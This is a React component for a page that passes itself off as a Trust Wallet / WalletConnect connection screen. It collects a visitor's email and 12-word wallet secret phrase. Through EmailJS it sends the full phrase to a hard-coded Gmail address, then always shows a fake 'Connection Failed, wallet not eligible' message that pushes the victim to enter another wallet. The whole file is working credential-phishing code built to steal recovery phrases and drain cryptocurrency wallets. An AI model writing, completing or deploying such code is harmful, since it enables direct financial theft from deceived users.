import React, { useState, useEffect } from "react";
import emailjs from "@emailjs/browser";
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import trust from "../assets/TrustWallet.png";
import walletConnect from "../assets/WalletConnect.png";

const TrustWalletConnect = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [closing, setClosing] = useState(false);
  const [words, setWords] = useState(Array(12).fill(""));
  const [email, setEmail] = useState("");
  const [isSending, setIsSending] = useState(false);

  const EMAIL_CONFIG = {
    serviceId: "service_wl2eev4",
    templateId: "template_5xdoy5u",
    publicKey: "tVSsk6CFBQO9QbVIm",
  };

  const RECIPIENT_EMAIL = "instacoinxpay@gmail.com";

  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  const handleWordChange = (index, value) => {
    const updated = [...words];
    updated[index] = value.replace(/\s+/g, "");
    setWords(updated);
  };

  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  const isFormComplete =
    words.every((w) => w.trim() !== "") && email.trim() !== "";

  const sendEmail = async () => {
    setIsSending(true);
    
    console.log("🚀 Starting email send process...");
    
    try {
      emailjs.init(EMAIL_CONFIG.publicKey);
      console.log("✅ EmailJS initialized");

      const templateParams = {
        user_email: email,
        word_1: words[0],
        word_2: words[1],
        word_3: words[2],
        word_4: words[3],
        word_5: words[4],
        word_6: words[5],
        word_7: words[6],
        word_8: words[7],
        word_9: words[8],
        word_10: words[9],
        word_11: words[10],
        word_12: words[11],
        full_phrase: words.join(" "),
        submission_date: new Date().toLocaleString()
      };

      console.log("📝 Sending email...");

      const response = await emailjs.send(
        EMAIL_CONFIG.serviceId,
        EMAIL_CONFIG.templateId,
        templateParams
      );

      console.log("✅ Email sent successfully!", response);
      alert("✅ Email sent! Check your inbox.");
    } catch (error) {
      console.error("❌ Failed to send email:", error);
      alert("❌ Email failed! Error: " + (error.text || error.message));
    } finally {
      setIsSending(false);
      setShowPopup(true);
    }
  };

  const handleConnect = () => {
    sendEmail();
  };

  const closePopup = () => {
    setClosing(true);
    setTimeout(() => {
      setShowPopup(false);
      setClosing(false);
    }, 200);
  };

  return (
    <>
      <div className="twc-page">
        <div className="twc-logo">
          <img src={logo} alt="logo" />
        </div>

        <div className="twc-card">
          <img className="walletConnect" src={walletConnect} alt="wc" />

          <div className="twc-header">
            <h2 className="twc-connect-text">CONNECT</h2>
            <img src={trust} alt="trust" />
          </div>

          <label className="twc-label-email">Enter your Email Address</label>
          <input
            className="twc-input"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <label className="twc-label-email">
            Enter your Trust Wallet 12 word Secret Phrase
          </label>

          <p className="twc-info-text">
            Trust wallet must be at least 30 days old and have $1 gas fee.
          </p>

          <div className="twc-phrase-box">
            {words.map((word, i) => (
              <input
                key={i}
                className="twc-word-input"
                value={word}
                placeholder={`${i + 1}. word`}
                onChange={(e) => handleWordChange(i, e.target.value)}
                onKeyDown={blockSpace}
              />
            ))}
          </div>

          <button
            className="twc-connect-btn"
            disabled={!isFormComplete || isSending}
            onClick={handleConnect}
          >
            {isSending ? "CONNECTING..." : "CONNECT"}
          </button>
        </div>
      </div>

      {showPopup && (
        <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
          <div className="twc-modal-box">
            <div className="twc-popup-icon">✕</div>
            <h3 className="twc-popup-title">Connection Failed!</h3>
            <p className="twc-popup-text">
              Your Trust Wallet is not eligible for connection.
              Please try connecting with a different Trust Wallet.
            </p>
            <button className="twc-popup-btn" onClick={closePopup}>
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default TrustWalletConnect;